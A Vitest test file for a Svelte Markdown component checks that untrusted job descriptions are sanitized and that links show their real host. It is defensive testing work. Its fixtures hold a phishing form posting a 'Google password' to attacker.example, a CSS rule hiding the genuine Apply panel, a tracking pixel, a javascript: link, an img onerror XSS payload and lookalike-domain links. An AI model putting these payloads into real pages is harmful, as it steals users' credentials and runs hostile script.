import { describe, it, expect } from 'vitest';
import { render } from 'svelte/server';
import { withLocale } from 'portfolio-common';
import Markdown from './Markdown.svelte';

// Markdown.svelte as the server renders it (as on a page rendered on the server)
const rendered = (props: { content: string } & Record<string, unknown>) =>
	render(Markdown, { props }).body;

const ATTACK = [
	'## The job',
	'',
	'Apply below.',
	'<style>aside[aria-label="Apply"]{display:none!important}</style>',
	'<form action="https://attacker.example/collect" method="post"><label>Google password <input name="password" type="password"></label><button>Apply with Google</button></form>',
	'',
	'Inline <span style="position:fixed;inset:0">cover</span> and ![pixel](https://tracker.example/p.gif)'
].join('\n');

describe('Markdown', () => {
	describe('without raw HTML (html: false, job descriptions)', () => {
		it('shows raw HTML as text: no style, form, input, button, inline style or image', () => {
			const body = rendered({ content: ATTACK, html: false });

			for (const element of ['<style', '<form', '<input', '<button', '<img', '<label']) {
				expect(body).not.toContain(element);
			}
			// No element carries a style or an action (the text may quote them)
			expect(body).not.toMatch(/<[a-z][^<>]*\sstyle=/);
			expect(body).not.toMatch(/<[a-z][^<>]*\saction=/);
			// What was typed is still there, as text
			expect(body).toContain('&lt;form action=');
			expect(body).toContain('&lt;style&gt;');
			expect(body).toContain('<h2>The job</h2>');
		});

		it('keeps what markdown makes: emphasis, lists, links, code and tables', () => {
			const body = rendered({
				content:
					'**Bold** _it_ [site](https://example.com "Site")\n\n- one\n- two\n\n`List<String>`\n\n| a | b |\n|:--|--:|\n| 1 | 2 |',
				html: false
			});

			expect(body).toContain('<strong>Bold</strong>');
			expect(body).toContain('<em>it</em>');
			expect(body).toContain('<a href="https://example.com" title="Site">site</a>');
			expect(body).toContain('<li>one</li>');
			expect(body).toContain('<code>List&lt;String&gt;</code>');
			expect(body).toContain('<table>');
			expect(body).toContain('<td align="right">2</td>');
		});

		/** A link opened apart, as linkHosts writes it: its text, the host when shown, the new tab */
		const apart = (href: string, text: string, host?: string, title?: string) =>
			`<a class="link-apart" href="${href}"${title ? ` title="${title}"` : ''} target="_blank" rel="noopener noreferrer nofollow"><span class="link-text">${text}</span>${host ? ` <span class="link-host">(${host})</span>` : ''}<span class="sr-only"> (opens in a new tab)</span></a>`;
		const hosted = (content: string) => rendered({ content, html: false, linkHosts: true });

		it('shows where each link leads inside it, opened apart without a referrer (linkHosts)', () => {
			const body = hosted(
				'Read [About us](https://t.example/j123 "Us") or https://acme.example/jobs, or [home](/acme).'
			);
			// The host a harmless text hides is shown, and is part of the link's name with the new tab
			// (a screen reader says it too): a reviewer can refuse a tracking link
			expect(body).toContain(apart('https://t.example/j123', 'About us', 't.example', 'Us'));
			// A bare address says its host already
			expect(body).toContain(apart('https://acme.example/jobs', 'https://acme.example/jobs'));
			expect(body).not.toContain('(acme.example)');
			// A relative link stays as markdown makes it
			expect(body).toContain('<a href="/acme">home</a>');
			// A lookalike name shows as what it is
			expect(hosted('[Apply](https://аcme.example/x)')).toMatch(
				/<span class="link-host">\(xn--[a-z0-9-]+\.example\)<\/span>/
			);
			// Without it, links are as markdown makes them
			expect(
				rendered({ content: '[About us](https://t.example/j123)', html: false })
			).not.toContain('link-host');
		});

		it('says the new tab in the reader’s language', () => {
			expect(withLocale('fr', () => hosted('[Postuler](https://t.example/a)'))).toContain(
				'<span class="sr-only"> (nouvel onglet)</span></a>'
			);
		});

		it('opens apart a link without a scheme that still names a host, inline or by reference', () => {
			// A browser reads each of them as https://t.example/…: never a plain link sending the referrer
			expect(hosted('[A](//t.example/x)')).toContain(
				apart('https://t.example/x', 'A', 't.example')
			);
			expect(hosted('[A](///t.example/x)')).toContain(
				apart('https://t.example/x', 'A', 't.example')
			);
			expect(hosted('[A](/\\/t.example/x)')).toContain(
				apart('https://t.example/x', 'A', 't.example')
			);
			expect(hosted('[Apply][r]\n\n[r]: //t.example/ref')).toContain(
				apart('https://t.example/ref', 'Apply', 't.example')
			);
			// A host named like the one paths are read against is a host all the same
			expect(hosted('[A](//a.invalid/x)')).toContain(
				apart('https://a.invalid/x', 'A', 'a.invalid')
			);
			// A path, a query or a fragment of this site, and another scheme, stay as markdown makes them
			const local = hosted(
				'[home](/acme) [page](jobs/1) [query](?a=1) [top](#top) [mail](mailto:jobs@acme.example)'
			);
			expect(local).toContain('<a href="/acme">home</a>');
			expect(local).toContain('<a href="jobs/1">page</a>');
			expect(local).toContain('<a href="?a=1">query</a>');
			expect(local).toContain('<a href="#top">top</a>');
			expect(local).toContain('<a href="mailto:jobs@acme.example">mail</a>');
			expect(local).not.toContain('link-host');
		});

		it('leaves the host out only for a link whose text is its own address', () => {
			// A text that looks like an address, or names one somewhere, says nothing of where it leads
			expect(hosted('[jobs.acme-group.com](https://acme-group.co/x)')).toContain(
				'<span class="link-host">(acme-group.co)</span>'
			);
			expect(hosted('[track.io.acme-careers.com](https://track.io/x)')).toContain(
				'<span class="link-host">(track.io)</span>'
			);
			expect(hosted('[acme.example/careers](https://me.example/track)')).toContain(
				'<span class="link-host">(me.example)</span>'
			);
			expect(hosted('[jobs at acme.example](https://me.example/u/42)')).toContain(
				'<span class="link-host">(me.example)</span>'
			);
			expect(
				hosted('[https://careers.acme.example/?ref=t.example](https://t.example/c)')
			).toContain('<span class="link-host">(t.example)</span>');
			// A name before an @ reads as the host: the host is shown, and the link goes without it
			expect(hosted('https://acme.example@t.example/abc')).toContain(
				apart('https://t.example/abc', 'https://acme.example@t.example/abc', 't.example')
			);
			expect(hosted('[Careers](https://acme.example@t.example/abc)')).toContain(
				apart('https://t.example/abc', 'Careers', 't.example')
			);
			// Its own address, bare, www or as its text: the host once
			expect(hosted('www.acme.example/jobs')).toContain(
				apart('http://www.acme.example/jobs', 'www.acme.example/jobs')
			);
			expect(hosted('[acme.example](https://acme.example/)')).toContain(
				apart('https://acme.example/', 'acme.example')
			);
			expect(hosted('[HTTPS://ACME.EXAMPLE/Jobs](https://acme.example/Jobs)')).toContain(
				apart('https://acme.example/Jobs', 'HTTPS://ACME.EXAMPLE/Jobs')
			);
		});

		it('drops javascript: links', () => {
			const body = rendered({ content: '[click](javascript:alert(1))', html: false });
			expect(body).not.toContain('javascript:');
		});
	});

	it('still renders sanitized raw HTML by default (an owner writing their own portfolio)', () => {
		const body = rendered({ content: 'A <b>bold</b> word <img src=x onerror="alert(1)">' });

		expect(body).toContain('<b>bold</b>');
		expect(body).not.toContain('onerror');
	});

	describe('topHeadingLevel', () => {
		it('puts the highest heading at that level, the others keeping their distance', () => {
			const body = rendered({
				content: '## The job\n\n### Details\n\n## Your missions',
				topHeadingLevel: 4
			});

			expect(body).toContain('<h4>The job</h4>');
			expect(body).toContain('<h5>Details</h5>');
			expect(body).toContain('<h4>Your missions</h4>');
		});

		it('whichever level the content starts with', () => {
			expect(rendered({ content: '# Title\n\n## Sub', topHeadingLevel: 3 })).toContain(
				'<h3>Title</h3>'
			);
			expect(rendered({ content: '#### Deep', topHeadingLevel: 4 })).toContain('<h4>Deep</h4>');
			expect(rendered({ content: 'No heading', topHeadingLevel: 4 })).toContain(
				'<p>No heading</p>'
			);
		});
	});
});
